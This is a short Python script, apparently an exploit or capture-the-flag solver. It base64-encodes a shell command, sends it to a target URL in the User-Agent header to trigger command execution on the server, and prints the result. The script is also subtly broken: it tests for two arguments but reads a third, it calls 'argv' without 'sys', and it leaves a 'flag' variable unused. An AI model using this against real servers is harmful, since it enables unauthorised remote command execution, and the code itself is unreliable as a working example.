import requests
import base64
import sys

def pwn(commandInput, url):
    command = base64.b64encode(bytes(commandInput, 'UTF-8'))
    flag = b''
    header = {'user-agent': command}
    r = requests.get(url, headers=header)
    print(r.content.decode('UTF-8'))

if __name__ == "__main__":
    if len(sys.argv) == 2:
        pwn(sys.argv[1], argv[2])
